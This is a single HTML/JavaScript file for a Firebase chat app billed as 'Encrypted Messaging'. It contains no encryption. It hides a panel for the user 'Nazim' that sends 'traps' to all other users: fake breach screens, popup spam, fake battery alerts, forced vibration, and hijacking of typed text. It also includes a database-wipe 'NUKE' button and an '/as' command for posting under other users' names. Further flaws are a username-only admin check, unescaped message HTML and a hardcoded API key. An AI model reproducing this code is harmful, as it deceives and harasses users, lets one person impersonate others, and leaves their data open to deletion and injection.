<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Connect | Encrypted Messaging</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root {
            --primary: #00d2ff;
            --accent: #9d50bb;
            --danger: #ff4b2b;
            --success: #00ff41;
            --bg: #0f0c29;
            --glass: rgba(255, 255, 255, 0.05);
            --border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body, html { 
            margin: 0; padding: 0; height: 100%; 
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: 'Inter', -apple-system, sans-serif;
            color: #fff; overflow: hidden;
        }

        /* Layout Container */
        .main-wrapper {
            max-width: 450px; margin: 0 auto; height: 100vh;
            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(10px);
            display: flex; flex-direction: column; position: relative;
            border-left: 1px solid var(--border); border-right: 1px solid var(--border);
        }

        /* Modern Header */
        header {
            padding: 20px; display: flex; justify-content: space-between; align-items: center;
            background: var(--glass); border-bottom: 1px solid var(--border);
        }
        header h1 { 
            font-size: 1.2rem; margin: 0; font-weight: 800; letter-spacing: 1px;
            background: linear-gradient(to right, var(--primary), var(--accent));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        /* Pages */
        .page { display: none; flex: 1; overflow-y: auto; padding: 20px; animation: fadeIn 0.4s ease-out; }
        .active { display: flex; flex-direction: column; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Login UI */
        .login-box { text-align: center; margin-top: 60px; padding: 30px; background: var(--glass); border-radius: 25px; border: 1px solid var(--border); }
        .login-box input {
            width: 100%; padding: 15px; border-radius: 15px; border: 1px solid var(--border);
            background: rgba(0,0,0,0.2); color: #fff; margin-top: 20px; text-align: center;
        }
        .btn-prime {
            width: 100%; padding: 15px; border-radius: 15px; border: none;
            background: linear-gradient(to right, var(--primary), var(--accent));
            color: #fff; font-weight: bold; margin-top: 20px; cursor: pointer;
        }

        /* Dashboard Cards */
        .dash-card {
            background: var(--glass); border: 1px solid var(--border);
            padding: 20px; border-radius: 20px; margin-bottom: 15px;
        }
        .status-pill {
            display: inline-block; padding: 5px 12px; border-radius: 20px;
            font-size: 10px; background: rgba(0, 210, 255, 0.1); color: var(--primary); border: 1px solid var(--primary);
        }

        /* Hacking Panel (Hidden by Default) */
        #nazim-panel {
            display: none; background: rgba(255, 0, 85, 0.1); border: 1px solid var(--danger);
            padding: 15px; border-radius: 15px; margin-bottom: 15px; grid-template-columns: repeat(3, 1fr); gap: 8px;
        }
        .hack-btn {
            padding: 10px; font-size: 9px; border-radius: 8px; border: 1px solid var(--danger);
            background: transparent; color: var(--danger); cursor: pointer; font-weight: bold; text-transform: uppercase;
        }
        .hack-btn:hover { background: var(--danger); color: #fff; }

        /* Chat Bubbles */
        .msg-container { display: flex; flex-direction: column; gap: 12px; padding-bottom: 100px; }
        .bubble { 
            max-width: 80%; padding: 12px 16px; border-radius: 20px; font-size: 14px; position: relative;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .me { align-self: flex-end; background: linear-gradient(to right, var(--primary), var(--accent)); color: #fff; border-bottom-right-radius: 5px; }
        .other { align-self: flex-start; background: var(--glass); border: 1px solid var(--border); border-bottom-left-radius: 5px; }
        .bubble b { display: block; font-size: 10px; margin-bottom: 4px; opacity: 0.7; }
        .bubble img { max-width: 100%; border-radius: 12px; margin-top: 8px; }

        /* Input Bar */
        .input-bar {
            position: absolute; bottom: 0; left: 0; width: 100%; padding: 20px;
            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
        }
        .input-inner {
            background: var(--glass); backdrop-filter: blur(15px); border: 1px solid var(--border);
            padding: 10px 15px; border-radius: 50px; display: flex; align-items: center; gap: 12px;
        }
        .input-inner input { flex: 1; background: transparent; border: none; color: #fff; }

        /* Scare Overlay */
        #scare-screen {
            display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
            background:#000; z-index:10000; flex-direction:column; align-items:center; justify-content:center;
            font-family: 'Courier New', monospace; color: var(--success); text-align:center;
        }
    </style>
</head>
<body>

<div id="scare-screen">
    <i class="fa-solid fa-skull-crossbones" style="font-size: 80px; color: var(--danger);"></i>
    <h2 id="scare-title" style="margin-top:20px;">SYSTEM BREACH</h2>
    <div id="logs" style="text-align:left; font-size:12px; width:80%;"></div>
</div>

<div class="main-wrapper">
    <header>
        <h1>LIVE CONNECT</h1>
        <i class="fa-solid fa-power-off" onclick="logout()" style="color:var(--danger); cursor:pointer;"></i>
    </header>

    <div id="loginPage" class="page active">
        <div class="login-box">
            <i class="fa-solid fa-shield-cat" style="font-size: 50px; color: var(--primary);"></i>
            <h2>Secure Login</h2>
            <p style="font-size: 12px; opacity:0.6;">Enter your codename to join the grid.</p>
            <input type="text" id="uName" placeholder="Username...">
            <button class="btn-prime" onclick="initLogin()">INITIALIZE</button>
        </div>
    </div>

    <div id="homePage" class="page">
        <div class="dash-card">
            <h3 id="welcome">Hello, User</h3>
            <div class="status-pill"><i class="fa-solid fa-circle-dot"></i> Network: Encrypted</div>
            <div class="status-pill" style="margin-left:5px;"><i class="fa-solid fa-users"></i> Online: <span id="onlineCount">0</span></div>
        </div>
        
        <div class="dash-card" style="cursor:pointer; text-align:center;" onclick="goChat('global', false)">
            <i class="fa-solid fa-earth-americas" style="font-size: 30px; color:var(--primary); margin-bottom:10px;"></i>
            <br><b>Join Global Server</b>
        </div>

        <p style="font-size: 11px; opacity:0.5; margin-top:20px;">AVAILABLE TARGETS:</p>
        <div id="userList"></div>
    </div>

    <div id="chatPage" class="page">
        <div id="nazim-panel" style="display: none;">
            <button class="hack-btn" onclick="fire('freeze')">Freeze</button>
            <button class="hack-btn" onclick="fire('scare')">Matrix</button>
            <button class="hack-btn" onclick="fire('vibrate')">Vibrate</button>
            <button class="hack-btn" onclick="fire('popups')">Popups</button>
            <button class="hack-btn" onclick="fire('battery')">Low Bat</button>
            <button class="hack-btn" onclick="fire('hijack')">Hijack</button>
            <button class="hack-btn" onclick="fire('restore')" style="border-color:var(--success); color:var(--success)">Restore</button>
            <button class="hack-btn" onclick="nuke()" style="background:var(--danger); color:#fff;">NUKE</button>
        </div>

        <div id="msgStream" class="msg-container"></div>

        <div class="input-bar">
            <div class="input-inner">
                <i id="wand" class="fa-solid fa-wand-sparkles" style="display:none; color: gold; cursor:pointer;" onclick="togglePanel()"></i>
                <label for="imgIn"><i class="fa-solid fa-plus" style="color:var(--primary); cursor:pointer;"></i></label>
                <input type="file" id="imgIn" accept="image/*" style="display:none;" onchange="sendImg(this)">
                <input type="text" id="msgIn" placeholder="Type a message...">
                <i class="fa-solid fa-paper-plane" style="color:var(--primary); cursor:pointer;" onclick="sendTxt()"></i>
            </div>
        </div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const fb = { apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE", databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com" };
const app = initializeApp(fb);
const db = getDatabase(app);
let myId = null, myRoom = "global", priv = false;
const ADMIN = "Nazim";

window.onload = () => {
    const saved = localStorage.getItem("lc_user");
    if(saved) startGrid(saved);
};

window.initLogin = () => {
    const val = document.getElementById("uName").value.trim();
    if(!val) return;
    localStorage.setItem("lc_user", val);
    startGrid(val);
};

function startGrid(n) {
    myId = n;
    document.getElementById("loginPage").classList.remove("active");
    document.getElementById("homePage").classList.add("active");
    document.getElementById("welcome").innerText = "Hello, " + myId;
    if(myId === ADMIN) document.getElementById("wand").style.display="block";

    onValue(ref(db, "traps/" + myId), snap => {
        const t = snap.val();
        const sc = document.getElementById("scare-screen");
        if(t === "freeze") { sc.style.display="flex"; document.getElementById("scare-title").innerText="TERMINAL FROZEN"; }
        if(t === "vibrate") { if(navigator.vibrate) navigator.vibrate([500,200,500]); }
        if(t === "popups") { for(let i=0; i<5; i++) alert("SECURITY ALERT: UNKNOWN BREACH!"); }
        if(t === "battery") { document.body.style.opacity = "0.1"; alert("Battery Critical (1%)"); }
        if(t === "hijack") { document.getElementById("msgIn").oninput = function() { this.value = "NAZIM IS MY KING 👑"; }; }
        if(t === "scare") { sc.style.display="flex"; runMatrix(); }
        if(t === "restore") { sc.style.display="none"; document.body.style.opacity="1"; document.getElementById("msgIn").oninput = null; }
    });

    if(myId !== ADMIN) set(ref(db, "signals/" + myId), true);
    listenNodes();
}

function runMatrix() {
    const lines = ["> INJECTING...", "> UPLOADING...", "> DATA EXFILTRATED", "> GOODBYE."];
    const logBox = document.getElementById("logs"); logBox.innerHTML = "";
    let i = 0; setInterval(() => { if(i < lines.length) logBox.innerHTML += lines[i++] + "<br>"; }, 700);
}

window.listenNodes = () => {
    onValue(ref(db, "signals"), snap => {
        const list = document.getElementById("userList"); list.innerHTML = "";
        let c = 0;
        snap.forEach(u => {
            c++;
            if(u.key !== myId) {
                let d = document.createElement("div"); d.className = "dash-card";
                d.style = "display:flex; justify-content:space-between; align-items:center; padding:15px; cursor:pointer;";
                d.innerHTML = `<span><i class="fa-solid fa-user-secret" style="color:var(--primary)"></i> &nbsp; ${u.key}</span> <i class="fa-solid fa-chevron-right" style="font-size:10px; opacity:0.3"></i>`;
                d.onclick = () => goChat(u.key, true);
                list.appendChild(d);
            }
        });
        document.getElementById("onlineCount").innerText = c;
    });
};

window.goChat = (target, isP) => {
    myRoom = isP ? [myId, target].sort().join("::") : "global";
    priv = isP;
    document.getElementById("homePage").classList.remove("active");
    document.getElementById("chatPage").classList.add("active");
    sync();
};

window.sendTxt = () => {
    const inp = document.getElementById("msgIn");
    if(!inp.value) return;
    if(myId === ADMIN && inp.value.startsWith("/as ")) {
        const p = inp.value.split(" ");
        push(ref(db, "streams/global"), { s: p[1], t: inp.value.replace("/as "+p[1]+" ", "") });
    } else {
        push(ref(db, priv ? "streams/priv/" + myRoom : "streams/global"), { s: myId, t: inp.value });
    }
    inp.value = "";
};

window.sendImg = (f) => {
    const r = new FileReader();
    r.onload = (e) => push(ref(db, priv ? "streams/priv/" + myRoom : "streams/global"), { s: myId, i: e.target.result });
    r.readAsDataURL(f.files[0]);
};

function sync() {
    const path = priv ? "streams/priv/" + myRoom : "streams/global";
    onValue(ref(db, path), snap => {
        const box = document.getElementById("msgStream"); box.innerHTML = "";
        snap.forEach(m => {
            const d = m.val();
            const div = document.createElement("div"); div.className = `bubble ${d.s === myId ? 'me' : 'other'}`;
            div.innerHTML = `<b>${d.s}</b> ${d.t ? d.t : `<img src="${d.i}">`}`;
            if(myId === ADMIN) {
                let x = document.createElement("span"); x.innerHTML = "✕";
                x.style = "position:absolute; top:-10px; right:0; color:red; cursor:pointer; font-size:10px;";
                x.onclick = () => remove(ref(db, path + "/" + m.key));
                div.appendChild(x);
            }
            box.appendChild(div);
        });
        box.parentElement.scrollTop = box.parentElement.scrollHeight;
    });
}

window.togglePanel = () => { const p = document.getElementById("nazim-panel"); p.style.display = p.style.display === "grid" ? "none" : "grid"; };
window.fire = (type) => { onValue(ref(db, "signals"), snap => { snap.forEach(u => { if(u.key !== ADMIN) set(ref(db, "traps/" + u.key), type); }); }, {onlyOnce:true}); };
window.nuke = () => { if(confirm("NUKE DATA?")) remove(ref(db)); };
window.logout = () => { localStorage.clear(); location.reload(); };
document.getElementById("msgIn").addEventListener("keypress", (e) => { if(e.key === 'Enter') sendTxt(); });
</script>
</body>
</html>
